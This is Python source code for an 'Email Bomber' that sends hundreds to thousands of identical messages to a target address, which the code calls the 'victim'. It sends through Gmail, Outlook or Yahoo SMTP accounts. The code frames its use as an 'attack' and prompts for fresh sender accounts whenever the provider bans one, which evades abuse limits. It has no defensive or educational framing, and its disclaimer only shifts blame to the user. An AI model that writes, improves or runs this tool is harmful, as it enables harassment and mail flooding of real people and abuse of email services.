import smtplib
import getpass
import sys
import time
import MailBomber_banner


class Colors:
    OCEAN_BLUE = "\033[96m"
    RED = "\033[91m"
    YELLOW = "\033[93m"
    NORMAL = "\033[90"
    GREEN = "\033[92m"


class MainProgram:

    def __init__(self):
        print(Colors.GREEN + "{+}{-} Email Bomber V1.0 {-}{+}")
        print(Colors.GREEN +
              "{+}{-} Made by Flat_Earth_Gary {-}{+}", end="")
        print(Colors.YELLOW + MailBomber_banner.Banner())
        print(Colors.RED + "BY USING THIS PROGRAM YOU TAKE FULL RESPONSIBLILTY FOR YOUR ACTIONS. I CAN NOT BE HELD ACCOUNTABLE FOR ANYTHING YOU USE THIS SOFTWARE FOR.")
        print("If you understand and agree on the conditions press enter. If not press CTRL - C")
        self.count = 0
        try:
            input()
        except KeyboardInterrupt:
            print("Shutting down...")
            sys.exit(1)

        print(Colors.RED + "FOR MORE INFO ABOUT SENDING MORE MAILS QUICKER type: info")
        print(Colors.OCEAN_BLUE +
              "If you do not want to see the info press", Colors.GREEN + "ENTER")
        info = input("> ")
        info = info.lower()
        if info == "info":
            self.second = second_method()
            self.second.Starting()
            sys.exit(1)

    def Main_Setup(self):

        print(Colors.YELLOW + "\n\n{+}{-} Input target mail adress {-}{+}")
        self.victim = str(input("> "))

        print("{+}{-} From mail adress {-}{+} (Note that this is needed to be able to send mails and will NOT be sent to me. I recommend you use a scrap mail)")
        self.from_mail = str(input("> "))
        self.psw = getpass.getpass()

        print("What do you want the subject of the mail to be?")
        try:
            self.subject = str(input("> "))
        except ValueError:
            print("Not correct value, try again.")

        print("Type in what message you want to be spammed:\n")
        self.message = str(input())
        self.msg = """From: %s\nSubject: %s\nTo/Victim: %s\n%s""" % (
            self.from_mail, self.subject, self.victim, self.message)

        print("Input mails sent (1, 2, 3, 4) || 1: 1000 | 2. 500 | 3. 150 | 4. COSTUME")

        while True:
            try:
                self.choice = int(input("> "))
                break
            except ValueError:
                print("Type a nubmer.")

        if self.choice == 1:
            self.amount = int(1000)
        elif self.choice == 2:
            self.amount = int(500)
        elif self.choice == 3:
            self.amount = int(150)
        elif self.choice == 4:
            print("You have chosen the COSTUME option. Enter the amount you want:")
            self.amount = int(input("> "))
        else:
            pass

        print(Colors.GREEN + "\nYou have chosen to send: " +
              str(self.amount) + " mails\n Victim: " + str(self.victim) + "\n Sender mail: " + self.from_mail)

        try:
            print("If this is correct press ENTER, if it's not press CTRL - C")
            input()
        except KeyboardInterrupt:
            print("Closing program")
            sys.exit(1)

    def Email(self):
        try:
            print(Colors.YELLOW + "{+}{-} Setting up mail server {-}{+}")
            self.server = str(
                input("Enter premade mailserver | 1: Gmail | 2: Outlook | 3: Yahoo\n> "))
            premade_servers = ["1", "2", "3"]
            if self.server not in premade_servers:
                print("Shutting down...")
                sys.exit(1)
            else:
                pass

            if self.server == "1":
                self.server = "Gmail"
                print("You have chosen the premade option:", self.server)
                self.server = "smtp.gmail.com"
                time.sleep(0.2)
                print("Setting up port...")
                self.port = int(587)
            elif self.server == "2":
                self.server = "Outlook"
                print("You have chosen the premade option: ", self.server)
                self.server = "smtp-mail.outlook.com"
                time.sleep(0.2)
                print("Setting up port...")
                self.port = int(587)
            elif self.server == "3":
                self.server = "Yahoo"
                print("You have chosen the premade option: ", self.server)
                self.server = "smtp.mail.yahoo.com"
                time.sleep(0.2)
                print("Setting up port...")
                self.port = int(587)
            else:
                sys.exit(1)

            print("{+}{-} Setting up mail server {-}{+}")
            self.s = smtplib.SMTP(self.server, self.port)
            print(Colors.GREEN + "Connection successfull")
            print(Colors.YELLOW + "Checking with ehlo")
            self.s.ehlo()
            time.sleep(0.1)
            print(Colors.GREEN + "Successfull")
            print(Colors.YELLOW + "Encrypting data...")
            self.s.starttls()
            time.sleep(0.1)
            print(Colors.GREEN + "Done")
            print(Colors.YELLOW + "Establishing connection")
            self.s.ehlo()
            time.sleep(0.1)
            print(Colors.GREEN + "Done")
            print(Colors.YELLOW + "Attempting to log in...")
            self.s.login(self.from_mail, self.psw)
            time.sleep(0.1)
            print(Colors.GREEN + "Sucessfully logged in")
            self.BLAST()
        except Exception as e:
            print(Colors.RED + f"ERROR: {e}")

    def sending_bomb(self):
        try:
            self.s.sendmail(self.from_mail, self.victim, self.msg)
            self.count += 1
            print(Colors.OCEAN_BLUE + "BOMB SENT NUMBER: " + str(self.count))
        except Exception:
            self.ShadowBanned()

    def BLAST(self):
        print(Colors.RED + "{+}{-} Initalizing attack {-}{+}")
        for mail in range(self.amount):
            try:
                self.sending_bomb()
                if self.count == self.amount:
                    break
            except Exception and not KeyboardInterrupt as e:
                print(Colors.RED +
                      f"ERROR DETECTED: {e}")
                print(Colors.YELLOW + "No need to panick, this is most likely a ban/shadowban on your account. Fix this by assigning a new account.")
                self.ShadowBanned()
            except KeyboardInterrupt:
                print("shutting down...")
                sys.exit(1)

        self.s.close()
        print(Colors.GREEN +
              "{+}{-} Sucessfully Executed Attack (%s) mail sent {-}{+}" % (self.amount))
        self.finished()

    def finished(self):
        print("{+}{-} Attack finished {-}{+}")
        print("closing down...")
        sys.exit(0)

    def ShadowBanned(self):
        self.from_mail = str(input(
            Colors.RED + "Input new mail adress (don't bother putting in the same, it most likely won't work): "))
        self.psw = getpass.getpass("Type the password: ")
        print("If you want to start off from the begining (setting up what msg you want and so on) type: ", end="")
        print(Colors.YELLOW + "restart", end=" ")
        print(Colors.OCEAN_BLUE + "else press: " + Colors.GREEN + "ENTER")
        t = str(input())
        t = t.lower()
        if t == "restart":
            self.ShadowBanned_setup()
            self.Email()
        else:
            self.Shadow_continue()

    def ShadowBanned_setup(self):
        print("Type in what message you want to be spammed:\n")
        self.message = str(input())
        self.msg = """From: %s\nTo/Victim: %s\n%s""" % (
            self.from_mail,  self.victim, self.message)

        print("Input mails sent (1, 2, 3, 4) || 1: 1000 | 2. 500 | 3. 150 | 4. COSTUME")

        while True:
            try:
                self.choice = int(input("> "))
                break
            except ValueError:
                print("Type a nubmer.")

        if self.choice == 1:
            self.amount = int(1000)
        elif self.choice == 2:
            self.amount = int(500)
        elif self.choice == 3:
            self.amount = int(150)
        elif self.choice == 4:
            print("You have chosen the COSTUME option. Enter the amount you want:")
            self.amount = int(input("> "))
        else:
            pass

        print(Colors.GREEN + "\nYou have chosen to send: " +
              str(self.amount) + " mails\n Victim: " + str(self.victim) + "\n Sender mail: " + self.from_mail)

        try:
            print("If this is correct press ENTER, if it's not press CTRL - C")
            input()
        except KeyboardInterrupt:
            print("Closing program")
            sys.exit(1)

    def Shadow_continue(self):
        try:
            print("{+}{-} Setting up mail server {-}{+}")
            self.s = smtplib.SMTP(self.server, self.port)
            print(Colors.GREEN + "Connection successfull")
            print(Colors.YELLOW + "Checking with ehlo")
            self.s.ehlo()
            time.sleep(0.1)
            print(Colors.GREEN + "Successfull")
            print(Colors.YELLOW + "Encrypting data...")
            self.s.starttls()
            time.sleep(0.1)
            print(Colors.GREEN + "Done")
            print(Colors.YELLOW + "Establishing connection")
            self.s.ehlo()
            time.sleep(0.1)
            print(Colors.GREEN + "Done")
            try:
                print(Colors.YELLOW + "Attempting to log in...")
                self.s.login(self.from_mail, self.psw)
            except Exception:
                print(Colors.RED + "Login unsuccessfull")
                print(
                    "Restart the program and be sure you type in the corret mail adress and password.")
                sys.exit(1)
            time.sleep(0.1)
            print(Colors.GREEN + "Sucessfully logged in")
            self.BLAST()
        except Exception:
            pass


class second_method(MainProgram):

    def __init__(self):
        self.mail = ""
        try:
            print("What is your first mailadress?")
            self.mail_1 = str(input("> "))
            self.mail_1_psw = getpass.getpass()
            print("What is your second mailadress?")
            self.mail_2 = str(input("> "))
            self.mail_2_psw = getpass.getpass()
        except ValueError as e:
            print(Colors.RED + f"ERROR: {e}")
            sys.exit(1)

        print(Colors.OCEAN_BLUE + "You have chosen: " +
              str(self.mail_1) + "; as your first mailadress")
        print("You have chosen: " + str(self.mail_2) +
              "; as your second mailadress")
        try:
            print(Colors.YELLOW + "If this is correct, press: " +
                  Colors.GREEN + "ENTER" + Colors.OCEAN_BLUE + "\nelse press CTRL - C")
            input()
        except KeyboardInterrupt:
            print(Colors.RED + "CANCELLED")
            print("Shutting down...")
            sys.exit(1)

    def Starting(self):

        print(Colors.YELLOW + "\n\n{+}{-} Input target mail adress {-}{+}")
        self.victim = str(input("> "))
        print("Type in what message you want to be spammed:\n")
        self.message = str(input())
        self.mail = self.mail_1
        self.msg = """From: %s\nTo/Victim: %s\n%s""" % (
            self.mail, self.victim, self.message)

        print("Input mails sent (1, 2, 3, 4) || 1: 1000 | 2. 500 | 3. 150 | 4. COSTUME")

        while True:
            try:
                self.choice = int(input("> "))
                break
            except ValueError:
                print("Type a nubmer.")

        if self.choice == 1:
            self.amount = int(1000)
        elif self.choice == 2:
            self.amount = int(500)
        elif self.choice == 3:
            self.amount = int(150)
        elif self.choice == 4:
            print("You have chosen the COSTUME option. Enter the amount you want:")
            self.amount = int(input("> "))
        else:
            pass

        print(Colors.GREEN + "\nYou have chosen to send: " +
              str(self.amount) + " mails\n Victim: " + str(self.victim) + "\n Sender mail: " + Colors.YELLOW + self.mail_1 + Colors.GREEN + "; and as a second mail: " + Colors.YELLOW + self.mail_2)

        try:
            print("If this is correct press ENTER, if it's not press CTRL - C")
            input()
            self.Execution()
        except KeyboardInterrupt:
            print("Closing program")
            sys.exit(1)

    def Execution(self):
        try:
            print(Colors.YELLOW + "{+}{-} Setting up mail server {-}{+}")
            self.server = str(
                input("Enter premade mailserver | 1: Gmail | 2: Outlook | 3: Yahoo\n> "))
            premade_servers = ["1", "2", "3"]
            if self.server not in premade_servers:
                print("Shutting down...")
                sys.exit(1)
            else:
                pass

            if self.server == "1":
                self.server = "Gmail"
                print("You have chosen the premade option:", self.server)
                self.server = "smtp.gmail.com"
                time.sleep(0.2)
                print("Setting up port...")
                self.port = int(587)
            elif self.server == "2":
                self.server = "Outlook"
                print("You have chosen the premade option: ", self.server)
                self.server = "smtp-mail.outlook.com"
                time.sleep(0.2)
                print("Setting up port...")
                self.port = int(587)
            elif self.server == "3":
                self.server = "Yahoo"
                print("You have chosen the premade option: ", self.server)
                self.server = "smtp.mail.yahoo.com"
                time.sleep(0.2)
                print("Setting up port...")
                self.port = int(587)
            else:
                sys.exit(1)

        except Exception as e:
            print(Colors.RED + f"ERROR ENCOUNTERED: {e}")

        print("{+}{-} Setting up mail server {-}{+}")
        self.s = smtplib.SMTP(self.server, self.port)
        print(Colors.GREEN + "Connection successfull")
        print(Colors.YELLOW + "Checking with ehlo")
        self.s.ehlo()
        time.sleep(0.1)
        print(Colors.GREEN + "Successfull")
        print(Colors.YELLOW + "Encrypting data...")
        self.s.starttls()
        time.sleep(0.1)
        print(Colors.GREEN + "Done")
        print(Colors.YELLOW + "Establishing connection")
        self.s.ehlo()
        time.sleep(0.1)
        print(Colors.GREEN + "Done")
        print(Colors.YELLOW + "Attempting to log in...")
        self.s.login(self.mail_1, self.psw)
        time.sleep(0.1)
        print(Colors.GREEN + "Sucessfully logged in")
        self.Nagasaki()

    def Nagasaki(self):

        print(Colors.RED + "{+}{-} Initalizing attack {-}{+}")
        for mail in range(self.amount):
            try:
                self.Nukes()
                if self.count == self.amount:
                    break
            except Exception and not KeyboardInterrupt as e:
                print(Colors.RED +
                      f"ERROR DETECTED; DON'T WORRY, I GOT IT, CHANGING MAIL")
                self.ShadowBanned()
            except KeyboardInterrupt:
                print("shutting down...")
                sys.exit(1)

        self.s.close()
        print(Colors.GREEN +
              "{+}{-} Sucessfully Executed Attack (%s) mail sent {-}{+}" % (self.amount))
        self.finished()

    def Nukes(self):
        try:
            self.s.sendmail(self.from_mail, self.victim, self.msg)
            self.count += 1
            print(Colors.OCEAN_BLUE + "BOMB SENT NUMBER: " + str(self.count))
        except Exception:
            self.ShadowBanned()


Run = MainProgram()
Run.Main_Setup()
Run.Email()
